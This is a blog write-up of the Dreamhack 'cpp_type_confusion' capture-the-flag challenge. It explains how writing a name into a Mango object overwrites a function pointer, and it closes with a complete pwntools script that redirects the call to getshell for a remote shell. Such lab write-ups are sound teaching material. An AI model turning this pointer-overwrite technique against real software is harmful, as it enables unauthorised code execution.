+++
date = '2026-05-08'
draft = false
title = 'Dreamhack cpp_type_confusion Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++


## Challenge overview
    
이 문제는 서버에서 작동하고 있는 서비스(cpp-type-confusion)의 바이너리와 소스 코드가 주어집니다.
프로그램의 취약점을 찾아 flag를 획득하세요!
"flag" 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
플래그의 형식은 DH{...} 입니다.

---

This is a cpp challenge so I already know it's going to be a pain.


## Identifying the vulnerabilities

Usually these days I added the entire decompiled `main` function but it would clobber the page way too much; So I'll just include the important parts:

```c
while ( 1 )
  {
    print_menu();
    cin>>v17;
    switch ( v17 )
    {
      case 1:
        v3 = (Apple *)operator new(0x10u);
        Apple::Apple(v3);
        v18 = v3;
        cout, "Apple Created!");
        continue;
      case 2:
        v5 = (Mango *)operator new(0x10u);
        Mango::Mango(v5);
        v19 = v5;
        cout, "Mango Created!");
        continue;
      case 3:
        if ( appleflag && mangoflag )
        {
          applemangoflag = 1;
          v20 = v19;
          cout, "Applemango name: ");
          cin, v21);
          v7 = (const char *)std::string::c_str(v21);
          strncpy((char *)v20 + 8, v7, 8u);
          cout, "Applemango Created!");
          continue;
        }
        if ( !appleflag && !mangoflag )
        {
          cout, "You don't have anything!");
          continue;
        }
        if ( !appleflag )
          goto LABEL_12;
        if ( !mangoflag )
        {
          cout, "You don't have mango!");
        }
        break;
      case 4:
        cout, "1. Apple\n2. Mango\n3. Applemango\n[*] Select : ");
        cin, &v17);
        switch ( v17 )
        {
          case 1:
            if ( appleflag )
            {
              (**(void (__fastcall ***)(Apple *))v18)(v18);
            }
            else
            {
LABEL_12:
              cout, "You don't have apple!");
            }
            break;
          case 2:
            if ( mangoflag )
            {
              (**(void (__fastcall ***)(Mango *))v19)(v19);
            }
            else
            {
              cout, "you don't have mango!");
            }
            break;
          case 3:
            if ( applemangoflag )
            {
              (**(void (__fastcall ***)(Mango *))v20)(v20);
            }
            else
            {
              cout, "you don't have Applemango!");
            }
            break;
          default:
            cout, "Wrong Choice!");
            break;
        }
        break;
      case 5:
        cout, "bye!");
        goto LABEL_30;
      default:
LABEL_30:
        std::string::~string(v21);
        return 0;
    }
```

Keep in mind I cut out about half of the code (the meaningless parts) here. And looking through the function, we also have a `getshell` one.

There are some class constructors that look like so:

```c
// Alternative name is '_ZN5AppleC2Ev'
void __fastcall Apple::Apple(Apple *this)
{
  Base::Base(this);
  *(_QWORD *)this = &off_401880;
  strcpy((char *)this + 8, "Appleyum");
  appleflag = 1;
}
```

Yes, classes look like this when decompiled, very much like functions! 

This will first extend the parent class, `Base`, initialize the `vtable` for the class (the first 8 bytes), then copy that string into what I assume to be a char array (the next 8 bytes - first actual use of the class).

Each class has a `vtable` that stores pointers to all the functions accessible to it. Then, each object of said class gets a pointer to the class' `vtable`, called a `vptr`.

Let's look at mango now:

```c
void __fastcall Mango::Mango(Mango *this)
{
  Base::Base(this);
  *(_QWORD *)this = &off_401868;
  *((_QWORD *)this + 1) = mangohi;
  mangoflag = 1;
}
```

This will set the second 8 bytes to *mangohi*, which is just a function that prints "Mangoyum".

When we choose to create an "Applemango", we get to write 8 bytes into a Mango's `+ 8`; which is a pointer to the `mangohi` (`v20` which is `v19` which is `v5`, Mango object).

So we can overwrite that pointer, and call the Mangoyum function which will now be overwritten with the shell. Next time it's called by "eat", it will execute what we overwrote `mangohi` with.

I whipped up a script really quickly doing exactly this, and it surprisingly worked first try! So let's connect remotely and get the flag.

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/cpp_type_confusion/cpp_type_confusion')

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:8735'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
getshell = 0x400FA6

#create apple
p.recvuntil(b": ")
p.sendline(b"1")

#create mango
p.recvuntil(b": ")
p.sendline(b"2")

#create applemango
p.recvuntil(b": ")
p.sendline(b"3")

#send "name"
p.recvuntil(b": ")
p.sendline(p64(getshell))

#eat applemango
p.recvuntil(b": ")
p.sendline(b"4")

p.recvuntil(b": ")
p.sendline(b"3")

p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/send_sig.py)**.
